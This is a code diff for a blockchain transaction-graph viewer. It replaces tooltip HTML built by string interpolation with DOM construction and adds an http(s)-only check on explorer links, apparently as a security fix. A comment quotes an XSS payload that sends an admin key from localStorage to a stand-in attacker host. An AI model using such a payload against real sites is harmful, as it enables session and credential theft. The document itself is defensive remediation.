@@ -445,24 +445,97 @@ document.getElementById("search").addEventListener("input", (e) => {
 });
 
 // Tooltips.
+//
+// v0.19.2 (round-13 sec-HIGH-1): tooltip content built via DOM
+// construction + textContent rather than template-literal string
+// interpolation into .html(). Pre-v0.19.2 every interpolated field
+// (d.label, d.identity, d.category, d.issuer, d.dominantSymbol,
+// d.explorerUrl, address fragments) flowed directly through D3's
+// .html() — which is innerHTML under the hood. The `identity` field
+// originates from vendor label feeds (Etherscan address-tag
+// submissions); a vendor who controls a label for an address that
+// lands in any case's graph injected
+// `<img src=x onerror=fetch('//attacker/'+localStorage.adminKey)>`
+// → arbitrary JS in the operator's browser with full admin context.
+// v0.18.2's JSON-script fix addressed the script-block escape but
+// not this JS-runtime sink. Now: every field assigned via
+// .textContent so HTML in vendor strings renders as text, not markup.
+// The explorer-URL link target is constructed via .setAttribute on a
+// freshly-created anchor element so an attacker-controlled URL also
+// can't inject `javascript:` or break out via attribute encoding.
+
+function _ttText(html, tag, text, opts) {
+  // Helper: append <tag>text</tag> via DOM. `opts` carries
+  // {className, label} for the common label-value tt-row pattern.
+  const el = document.createElement(tag);
+  if (opts && opts.className) el.className = opts.className;
+  if (opts && opts.label !== undefined) {
+    const span = document.createElement("span");
+    span.textContent = opts.label;
+    const b = document.createElement("b");
+    b.textContent = (text === null || text === undefined) ? "" : String(text);
+    el.appendChild(span);
+    el.appendChild(b);
+  } else {
+    el.textContent = (text === null || text === undefined) ? "" : String(text);
+  }
+  html.appendChild(el);
+}
+
+function _safeExplorerUrl(raw) {
+  // Reject anything other than http(s) URLs to block javascript: /
+  // data: / vbscript: injection via attacker-controlled label feed.
+  if (!raw || typeof raw !== "string") return null;
+  const lower = raw.toLowerCase().trim();
+  if (!lower.startsWith("http://") && !lower.startsWith("https://")) return null;
+  return raw;
+}
+
 function showNodeTooltip(event, d) {
-  const html = `
-    <div class="tt-title">${d.label || d.short}
-      <span class="chain-pill">${d.chain}</span>
-    </div>
-    <div class="tt-addr">${d.id}</div>
-    ${d.category && d.category !== "wallet" ?
-      `<div class="tt-row"><span>Category:</span><b>${d.category}</b></div>` : ""}
-    ${d.identity ?
-      `<div class="tt-row"><span>Identity:</span><b>${d.identity}</b></div>` : ""}
-    <div class="tt-row"><span>Inbound:</span><b>${d.inboundUsd}</b></div>
-    <div class="tt-row"><span>Outbound:</span><b>${d.outboundUsd}</b></div>
-    ${d.issuer ?
-      `<div class="tt-row"><span>Issuer:</span><b>${d.issuer}</b></div>` : ""}
-    ${d.explorerUrl ?
-      `<div style="margin-top:8px"><a href="${d.explorerUrl}" target="_blank">View on explorer →</a></div>` : ""}
-  `;
-  tooltip.html(html)
+  const root = document.createElement("div");
+
+  // Title row: label + chain pill.
+  const title = document.createElement("div");
+  title.className = "tt-title";
+  title.textContent = (d.label || d.short || "");
+  const pill = document.createElement("span");
+  pill.className = "chain-pill";
+  pill.textContent = d.chain || "";
+  title.appendChild(document.createTextNode(" "));
+  title.appendChild(pill);
+  root.appendChild(title);
+
+  // Address row.
+  _ttText(root, "div", d.id || "", {className: "tt-addr"});
+
+  if (d.category && d.category !== "wallet") {
+    _ttText(root, "div", d.category, {className: "tt-row", label: "Category:"});
+  }
+  if (d.identity) {
+    _ttText(root, "div", d.identity, {className: "tt-row", label: "Identity:"});
+  }
+  _ttText(root, "div", d.inboundUsd, {className: "tt-row", label: "Inbound:"});
+  _ttText(root, "div", d.outboundUsd, {className: "tt-row", label: "Outbound:"});
+  if (d.issuer) {
+    _ttText(root, "div", d.issuer, {className: "tt-row", label: "Issuer:"});
+  }
+
+  const safeUrl = _safeExplorerUrl(d.explorerUrl);
+  if (safeUrl) {
+    const wrap = document.createElement("div");
+    wrap.setAttribute("style", "margin-top:8px");
+    const a = document.createElement("a");
+    a.setAttribute("href", safeUrl);
+    a.setAttribute("target", "_blank");
+    a.setAttribute("rel", "noopener noreferrer");
+    a.textContent = "View on explorer →";
+    wrap.appendChild(a);
+    root.appendChild(wrap);
+  }
+
+  const node = tooltip.node();
+  node.replaceChildren(...root.childNodes);
+  tooltip
     .style("left", (event.pageX + 14) + "px")
     .style("top", (event.pageY + 14) + "px")
     .style("opacity", 1);
@@ -471,21 +544,38 @@ function showNodeTooltip(event, d) {
 function showEdgeTooltip(event, d) {
   const fromId = typeof d.source === "object" ? d.source.id : d.source;
   const toId = typeof d.target === "object" ? d.target.id : d.target;
-  const html = `
-    <div class="tt-title">${d.totalUsd}
-      ${d.isCrossChain ? '<span class="chain-pill">cross-chain</span>' : ""}
-    </div>
-    <div class="tt-addr">${fromId.slice(0,10)}…${fromId.slice(-6)} →
-       ${toId.slice(0,10)}…${toId.slice(-6)}</div>
-    <div class="tt-row"><span>Transfers:</span><b>${d.transferCount}</b></div>
-    ${d.dominantSymbol ?
-      `<div class="tt-row"><span>Dominant token:</span><b>${d.dominantSymbol}</b></div>` : ""}
-    ${d.firstTime ?
-      `<div class="tt-row"><span>First:</span><b>${d.firstTime.slice(0,10)}</b></div>` : ""}
-    ${d.lastTime ?
-      `<div class="tt-row"><span>Last:</span><b>${d.lastTime.slice(0,10)}</b></div>` : ""}
-  `;
-  tooltip.html(html)
+  const root = document.createElement("div");
+
+  const title = document.createElement("div");
+  title.className = "tt-title";
+  title.textContent = (d.totalUsd || "");
+  if (d.isCrossChain) {
+    const pill = document.createElement("span");
+    pill.className = "chain-pill";
+    pill.textContent = "cross-chain";
+    title.appendChild(document.createTextNode(" "));
+    title.appendChild(pill);
+  }
+  root.appendChild(title);
+
+  const addrLine = (fromId || "").slice(0, 10) + "…" + (fromId || "").slice(-6)
+    + " → " + (toId || "").slice(0, 10) + "…" + (toId || "").slice(-6);
+  _ttText(root, "div", addrLine, {className: "tt-addr"});
+
+  _ttText(root, "div", d.transferCount, {className: "tt-row", label: "Transfers:"});
+  if (d.dominantSymbol) {
+    _ttText(root, "div", d.dominantSymbol, {className: "tt-row", label: "Dominant token:"});
+  }
+  if (d.firstTime) {
+    _ttText(root, "div", String(d.firstTime).slice(0, 10), {className: "tt-row", label: "First:"});
+  }
+  if (d.lastTime) {
+    _ttText(root, "div", String(d.lastTime).slice(0, 10), {className: "tt-row", label: "Last:"});
+  }
+
+  const node = tooltip.node();
+  node.replaceChildren(...root.childNodes);
+  tooltip
     .style("left", (event.pageX + 14) + "px")
     .style("top", (event.pageY + 14) + "px")
     .style("opacity", 1);
